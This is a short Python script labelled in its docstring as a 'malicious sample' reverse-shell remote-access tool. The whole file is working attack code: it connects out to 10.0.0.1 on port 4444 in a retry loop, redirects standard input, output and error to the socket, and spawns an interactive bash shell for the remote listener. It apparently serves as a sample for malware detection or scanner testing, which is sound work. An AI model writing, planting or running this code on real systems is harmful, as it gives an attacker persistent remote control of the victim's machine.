#!/usr/bin/env python3
"""Malicious sample: reverse shell RAT."""
import socket
import subprocess
import os
import time

def connect_back():
    """Establish reverse shell connection."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("10.0.0.1", 4444))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["/bin/bash", "-i"], stdout=subprocess.PIPE)
        except Exception:
            time.sleep(30)
            continue

if __name__ == "__main__":
    connect_back()
